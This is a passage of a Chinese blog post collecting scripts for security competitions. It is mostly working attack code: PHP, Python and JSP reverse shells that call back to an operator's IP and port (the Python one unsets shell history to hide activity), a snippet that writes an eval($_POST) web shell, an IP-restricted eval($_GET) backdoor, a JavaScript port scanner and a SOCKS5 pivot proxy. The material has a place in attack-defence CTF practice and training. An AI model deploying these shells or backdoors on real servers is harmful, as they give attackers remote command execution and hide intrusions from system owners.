class="line">#在服务器没有gcc和perl,python的时候可以用到，调用php的函数反弹shell</span><br><span class="line">print ( &apos;&lt;title&gt;Back Connect&lt;/title&gt;&apos; );</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br&gt;&lt;b&gt;Php Back Connect&lt;br&gt; </span><br><span class="line">            Usage: nc -vv -l -p 21&lt;br&gt;</span><br><span class="line">            &lt;hr&gt; </span><br><span class="line">            &lt;form method=&apos;POST&apos; action=&apos;&apos;&gt;&lt;br&gt; </span><br><span class="line">            Your IP &amp; Port:&lt;br&gt; </span><br><span class="line">            &lt;input type=&apos;text&apos; name=&apos;ipim&apos; size=&apos;15&apos; value=&apos;&apos;&gt;</span><br><span class="line">            &lt;input type=&apos;text&apos; name=&apos;portum&apos; size=&apos;5&apos; value=&apos;21&apos;&gt;&lt;br&gt;&lt;br&gt; </span><br><span class="line">            &lt;input type=&apos;submit&apos; value=&apos;Connect&apos;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">            &lt;hr&gt;</span><br><span class="line">            &lt;/form&gt;&quot;; </span><br><span class="line">            </span><br><span class="line">         $ipim=$_POST[&apos;ipim&apos;]; </span><br><span class="line">         $portum=$_POST[&apos;portum&apos;]; </span><br><span class="line">         if ($ipim &lt;&gt; &quot;&quot;) </span><br><span class="line">         &#123; </span><br><span class="line">         $mucx=fsockopen($ipim , $portum , $errno, $errstr ); </span><br><span class="line">         if (!$mucx)&#123; </span><br><span class="line">               $result = &quot;Error: didnt connect !!!&quot;; </span><br><span class="line">         &#125; </span><br><span class="line">         else &#123; </span><br><span class="line">         </span><br><span class="line">         $zamazing0=&quot;\n&quot;;</span><br><span class="line">                  </span><br><span class="line">         fputs ($mucx ,&quot;\ng0t a shell.\n\n&quot;);</span><br><span class="line">         fputs($mucx , system(&quot;uname -a&quot;) .$zamazing0 );</span><br><span class="line">         fputs($mucx , system(&quot;pwd&quot;) .$zamazing0 );</span><br><span class="line">         fputs($mucx , system(&quot;id&quot;) .$zamazing0.$zamazing0 );</span><br><span class="line">         while(!feof($mucx))&#123;  </span><br><span class="line">       fputs ($mucx); </span><br><span class="line">       $one=&quot;[$&quot;;</span><br><span class="line">       $two=&quot;]&quot;;</span><br><span class="line">       $result= fgets ($mucx, 8192); </span><br><span class="line">      $message=`$result`; </span><br><span class="line">       fputs ($mucx, $one. system(&quot;whoami&quot;) .$two. &quot; &quot; .$message.&quot;\n&quot;); </span><br><span class="line">      &#125; </span><br><span class="line">      fclose ($mucx); </span><br><span class="line">         &#125; </span><br><span class="line">         &#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="python-反弹shell"><a href="#python-反弹shell" class="headerlink" title="python 反弹shell"></a>python 反弹shell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#反弹的同时直接帮你定义好历史命令变量,然后直接返回pty,比较方便些</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"></span><br><span class="line">shell = <span class="string">"/bin/sh"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">(programname)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Python connect-back door"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: %s &lt;conn_back_ip&gt; &lt;port&gt;"</span> % programname</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) !=<span class="number">3</span>:</span><br><span class="line">        usage(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s.connect((socket.gethostbyname(sys.argv[<span class="number">1</span>]),int(sys.argv[<span class="number">2</span>])))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+]Connect OK."</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[-]Can't connect"</span></span><br><span class="line">    sys.exit(<span class="number">2</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line"><span class="keyword">global</span> shell</span><br><span class="line">os.unsetenv(<span class="string">"HISTFILE"</span>)</span><br><span class="line">os.unsetenv(<span class="string">"HISTFILESIZE"</span>)</span><br><span class="line">pty.spawn(shell)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="jsp反弹shell"><a href="#jsp反弹shell" class="headerlink" title="jsp反弹shell"></a>jsp反弹shell</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">有些jsp的站点没安装php,你可以传perl,python反弹脚本或c反弹程序或nc上去来反弹,要是特殊情况下都不行呢？那就直接传这个上去吧，HTTP访问下就执行了，注意在源码里修改下IP 端口和要执行的程序</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    Socket socket = <span class="keyword">new</span> Socket( <span class="string">"192.168.1.4"</span>, <span class="number">4444</span> );</span><br><span class="line">                    Process process = Runtime.getRuntime().exec( <span class="string">"cmd.exe"</span> );</span><br><span class="line">                    ( <span class="keyword">new</span> StreamConnector( process.getInputStream(), </span><br><span class="line"></span><br><span class="line">socket.getOutputStream() ) ).start();</span><br><span class="line">                    ( <span class="keyword">new</span> StreamConnector( socket.getInputStream(), </span><br><span class="line"></span><br><span class="line">process.getOutputStream() ) ).start();</span><br><span class="line">                &#125; <span class="keyword">catch</span>( Exception e ) &#123;&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h2 id="php写入一句话木马"><a href="#php写入一句话木马" class="headerlink" title="php写入一句话木马"></a>php写入一句话木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &quot;开始写入&quot;; fputs(fopen(&quot;./shell.php&quot;,&quot;w&quot;),  &quot;&lt;?php   eval(\$_POST[1]); ?&gt;&quot; ); echo &quot;写入完成&quot;;?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">b=b64decode(<span class="string">"RU9CRC43aWdxNDs3NDFSOzFpa1I1MWliT08w"</span>)</span><br><span class="line"></span><br><span class="line">data=list(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">200</span>):</span><br><span class="line">    </span><br><span class="line">    key=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line"></span><br><span class="line">        key+=chr(ord(data[i])^k)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> key+<span class="string">"\n"</span></span><br></pre></td></tr></table></figure>

<h2 id="js端口扫描"><a href="#js端口扫描" class="headerlink" title="js端口扫描"></a>js端口扫描</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;端口扫描&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">    &lt;head&gt;&lt;/</span>head&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">"target"</span>&gt;target&lt;<span class="regexp">/label&gt;&lt;br/</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"target"</span> value=<span class="string">"127.0.0.1"</span>/&gt;<span class="xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">"port"</span>&gt;port&lt;<span class="regexp">/label&gt;&lt;br/</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"port"</span> value=<span class="string">"80"</span>/&gt;<span class="xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line">&lt;p&gt;you can use sequence <span class="keyword">as</span> well <span class="number">80</span>,<span class="number">81</span>,<span class="number">8080</span>&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">&lt;label for="timeout"&gt;timeout&lt;/</span>label&gt;<span class="xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"timeout"</span> value=<span class="string">"1000"</span>/&gt;<span class="xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">"result"</span>&gt;result&lt;<span class="regexp">/label&gt;&lt;br/</span>&gt;</span><br><span class="line">&lt;textarea id=<span class="string">"result"</span> name=<span class="string">"result"</span> rows=<span class="string">"7"</span> cols=<span class="string">"50"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line">&lt;input <span class="class"><span class="keyword">class</span></span>=<span class="string">"button"</span> type=<span class="string">"button"</span> value=<span class="string">"scan"</span> onClick=<span class="string">"javascript:scan(this.form)"</span>/&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">var AttackAPI = &#123;</span></span><br><span class="line"><span class="regexp">    version: 0.1,</span></span><br><span class="line"><span class="regexp">    author: "Petko Petkov (architect)",</span></span><br><span class="line"><span class="regexp">    homepage: "http:/</span><span class="regexp">/www.gnucitizen.org"</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">AttackAPI.PortScanner = &#123;&#125;;</span></span><br><span class="line"><span class="regexp">AttackAPI.PortScanner.scanPort = function (callback, target, port, timeout) &#123;</span></span><br><span class="line"><span class="regexp">    var timeout = (timeout == null)?100:timeout;</span></span><br><span class="line"><span class="regexp">    var img = new Image();</span></span><br><span class="line"><span class="regexp">   </span></span><br><span class="line"><span class="regexp">    img.onerror = function () &#123;</span></span><br><span class="line"><span class="regexp">        if (!img) return;</span></span><br><span class="line"><span class="regexp">        img = undefined;</span></span><br><span class="line"><span class="regexp">        callback(target, port, "open");</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">   </span></span><br><span class="line"><span class="regexp">    img.onload = img.onerror;</span></span><br><span class="line"><span class="regexp">    img.src = "http:/</span><span class="regexp">/" + target + ":" + port;</span></span><br><span class="line"><span class="regexp">   </span></span><br><span class="line"><span class="regexp">    setTimeout(function () &#123;</span></span><br><span class="line"><span class="regexp">        if (!img) return;</span></span><br><span class="line"><span class="regexp">        img = undefined;</span></span><br><span class="line"><span class="regexp">        callback(target, port, "closed");</span></span><br><span class="line"><span class="regexp">    &#125;, timeout);</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br><span class="line"><span class="regexp">AttackAPI.PortScanner.scanTarget = function (callback, target, ports, timeout)</span></span><br><span class="line"><span class="regexp">&#123;</span></span><br><span class="line"><span class="regexp">    for (index = 0; index &lt; ports.length; index++)</span></span><br><span class="line"><span class="regexp">    AttackAPI.PortScanner.scanPort(callback, target, ports[index], timeout);</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> result = <span class="built_in">document</span>.getElementById(<span class="string">"result"</span>);</span><br><span class="line"><span class="keyword">var</span> callback = <span class="function"><span class="keyword">function</span> (<span class="params">target, port, status</span>) </span>&#123;</span><br><span class="line">    result.value += target + <span class="string">":"</span> + port +  status + <span class="string">" \n"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> scan = <span class="function"><span class="keyword">function</span> (<span class="params">form</span>) </span>&#123;</span><br><span class="line">    AttackAPI.PortScanner.scanTarget(callback, form.target.value, form.port.value.split(<span class="string">","</span>), form.timeout.value);</span><br><span class="line">&#125;;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="python代理脚本python2"><a href="#python代理脚本python2" class="headerlink" title="python代理脚本python2"></a>python代理脚本python2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="comment"># Filename s5.py </span></span><br><span class="line"><span class="comment"># Python Dynamic Socks5 Proxy </span></span><br><span class="line"><span class="comment"># Usage: python s5.py 1080 </span></span><br><span class="line"><span class="comment"># Backgroup Run: nohup python s5.py 1080 &amp; </span></span><br><span class="line"><span class="comment"># Email: ringzero@557.im </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket, sys, select, SocketServer, struct, time </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadingTCPServer</span><span class="params">(SocketServer.ThreadingMixIn, SocketServer.TCPServer)</span>:</span> <span class="keyword">pass</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Socks5Server</span><span class="params">(SocketServer.StreamRequestHandler)</span>:</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_tcp</span><span class="params">(self, sock, remote)</span>:</span> </span><br><span class="line">        fdset = [sock, remote] </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line">            r, w, e = select.select(fdset, [], []) </span><br><span class="line">            <span class="keyword">if</span> sock <span class="keyword">in</span> r: </span><br><span class="line">                <span class="keyword">if</span> remote.send(sock.recv(<span class="number">4096</span>)) &lt;= <span class="number">0</span>: <span class="keyword">break</span> </span><br><span class="line">            <span class="keyword">if</span> remote <span class="keyword">in</span> r: </span><br><span class="line">                <span class="keyword">if</span> sock.send(remote.recv(<span class="number">4096</span>)) &lt;= <span class="number">0</span>: <span class="keyword">break</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span> </span><br><span class="line">        <span class="keyword">try</span>: </span><br><span class="line">            <span class="keyword">pass</span> <span class="comment"># print 'from ', self.client_address nothing to do. </span></span><br><span class="line">            sock = self.connection </span><br><span class="line">            <span class="comment"># 1. Version </span></span><br><span class="line">            sock.recv(<span class="number">262</span>) </span><br><span class="line">            sock.send(<span class="string">"\x05\x00"</span>); </span><br><span class="line">            <span class="comment"># 2. Request </span></span><br><span class="line">            data = self.rfile.read(<span class="number">4</span>) </span><br><span class="line">            mode = ord(data[<span class="number">1</span>]) </span><br><span class="line">            addrtype = ord(data[<span class="number">3</span>]) </span><br><span class="line">            <span class="keyword">if</span> addrtype == <span class="number">1</span>:       <span class="comment"># IPv4 </span></span><br><span class="line">                addr = socket.inet_ntoa(self.rfile.read(<span class="number">4</span>)) </span><br><span class="line">            <span class="keyword">elif</span> addrtype == <span class="number">3</span>:     <span class="comment"># Domain name </span></span><br><span class="line">                addr = self.rfile.read(ord(sock.recv(<span class="number">1</span>)[<span class="number">0</span>])) </span><br><span class="line">            port = struct.unpack(<span class="string">'&gt;H'</span>, self.rfile.read(<span class="number">2</span>)) </span><br><span class="line">            reply = <span class="string">"\x05\x00\x00\x01"</span> </span><br><span class="line">            <span class="keyword">try</span>: </span><br><span class="line">                <span class="keyword">if</span> mode == <span class="number">1</span>:  <span class="comment"># 1. Tcp connect </span></span><br><span class="line">                    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">                    remote.connect((addr, port[<span class="number">0</span>])) </span><br><span class="line">                    <span class="keyword">pass</span> <span class="comment"># print 'To', addr, port[0]  nothing do to. </span></span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    reply = <span class="string">"\x05\x07\x00\x01"</span> <span class="comment"># Command not supported </span></span><br><span class="line">                local = remote.getsockname() </span><br><span class="line">                reply += socket.inet_aton(local[<span class="number">0</span>]) + struct.pack(<span class="string">"&gt;H"</span>, local[<span class="number">1</span>]) </span><br><span class="line">            <span class="keyword">except</span> socket.error: </span><br><span class="line">                <span class="comment"># Connection refused </span></span><br><span class="line">                reply = <span class="string">'\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00'</span> </span><br><span class="line">            sock.send(reply) </span><br><span class="line">            <span class="comment"># 3. Transfering </span></span><br><span class="line">            <span class="keyword">if</span> reply[<span class="number">1</span>] == <span class="string">'\x00'</span>:  <span class="comment"># Success </span></span><br><span class="line">                <span class="keyword">if</span> mode == <span class="number">1</span>:    <span class="comment"># 1. Tcp connect </span></span><br><span class="line">                    self.handle_tcp(sock, remote) </span><br><span class="line">        <span class="keyword">except</span> socket.error: </span><br><span class="line">            <span class="keyword">pass</span> <span class="comment">#print 'error' nothing to do . </span></span><br><span class="line">        <span class="keyword">except</span> IndexError: </span><br><span class="line">            <span class="keyword">pass</span> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span> </span><br><span class="line">    filename = sys.argv[<span class="number">0</span>]; </span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)&lt;<span class="number">2</span>: </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'usage: '</span> + filename + <span class="string">' port'</span> </span><br><span class="line">        sys.exit() </span><br><span class="line">    socks_port = int(sys.argv[<span class="number">1</span>]);     </span><br><span class="line">    server = ThreadingTCPServer((<span class="string">''</span>, socks_port), Socks5Server) </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'bind port: %d'</span> % socks_port + <span class="string">' ok!'</span> </span><br><span class="line">    server.serve_forever() </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="一句话木马限制IP版本"><a href="#一句话木马限制IP版本" class="headerlink" title="一句话木马限制IP版本"></a>一句话木马限制IP版本</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</span><br><span class="line">	        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</span><br><span class="line">	            $cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">	        <span class="keyword">else</span></span><br><span class="line">	            $cip = <span class="string">"0.0.0.0"</span>;</span><br><span class="line">	        <span class="keyword">return</span> $cip;</span><br><span class="line">	        &#125;</span><br><span class="line"></span><br><span class="line">	$GetIPs = GetIP(); </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>($GetIPs==<span class="string">"172.24.10.1"</span>) <span class="comment">//允许连接的ip</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">eval</span>($_GET[<span class="string">"pass"</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

  
	</div>
		<footer class="article-footer clearfix">
<div class="article-catetags">


  <div class="article-tags">
  
  <span></span> <a href="/tags/竞赛/">竞赛</a><a href="/tags/脚本/">脚本</a>
  </div>

</div>



	<div class="article-share" id="share">
	
	  <div data-url="http://blog.wangluomingong.top/2018/08/28/竞赛中常用的脚本/" data-title="竞赛中常用的脚本 | D&#39;Blog" data-tsina class="share clearfix">
	  </div>
	
	</div>


</footer>

   	       
	</article>
	
<nav class="article-nav clearfix">
 
 <div class="prev">
 <a href="/2018/08/28/Lampiao渗透writeup/" title="lampiao靶机渗透">
  <strong>上一篇：</strong><br>
  <span>
  lampiao靶机渗透</span>
</a>
</div>


<div class="next">
<a href="/2018/08/24/百度杯CTF比赛 十一月场/" title="“百度杯”CTF比赛 十一月场 wp">
 <strong>下一篇：</strong><br> 
 <span>“百度杯”CTF比赛 十一月场 wp
</span>
</a>
</div>

</nav>

	



</div>  
      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>

  <div id="toc" class="toc-aside">
  <strong class="toc-title">Contents</strong>
 
 <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh连接脚本"><span class="toc-number">1.</span> <span class="toc-text">ssh连接脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python与msf交互脚本"><span class="toc-number">2.</span> <span class="toc-text">python与msf交互脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh爆破脚本"><span class="toc-number">3.</span> <span class="toc-text">ssh爆破脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ftp匿名登陆"><span class="toc-number">4.</span> <span class="toc-text">ftp匿名登陆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php不死马"><span class="toc-number">5.</span> <span class="toc-text">php不死马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#杀进程"><span class="toc-number">6.</span> <span class="toc-text">杀进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见编码反转脚本"><span class="toc-number">7.</span> <span class="toc-text">常见编码反转脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php反弹shell"><span class="toc-number">8.</span> <span class="toc-text">php反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP反弹shell"><span class="toc-number">9.</span> <span class="toc-text">PHP反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python-反弹shell"><span class="toc-number">10.</span> <span class="toc-text">python 反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jsp反弹shell"><span class="toc-number">11.</span> <span class="toc-text">jsp反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php写入一句话木马"><span class="toc-number">12.</span> <span class="toc-text">php写入一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xor"><span class="toc-number">13.</span> <span class="toc-text">xor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#js端口扫描"><span class="toc-number">14.</span> <span class="toc-text">js端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python代理脚本python2"><span class="toc-number">15.</span> <span class="toc-text">python代理脚本python2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一句话木马限制IP版本"><span class="toc-number">16.</span> <span class="toc-text">一句话木马限制IP版本</span></a></li></ol>
 
  </div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
<aside class="clearfix">

  

  
<div class="tagslist">
	<p class="asidetitle">Tags</p>
		<ul class="clearfix">
		
			
				<li><a href="/tags/web安全/" title="web安全">web安全<sup>9</sup></a></li>
			
		
			
				<li><a href="/tags/sql注入/" title="sql注入">sql注入<sup>7</sup></a></li>
			
		
			
				<li><a href="/tags/mysql/" title="mysql">mysql<sup>6</sup></a></li>
			
		
			
				<li><a href="/tags/c/" title="c++">c++<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/自考/" title="自考">自考<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/ctf/" title="ctf">ctf<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/web-靶机/" title="web-靶机">web-靶机<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/数据结构/" title="数据结构">数据结构<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/CTF/" title="CTF">CTF<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/靶机渗透/" title="靶机渗透">靶机渗透<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/php/" title="php">php<sup>2</sup></a></li>
			
		
			
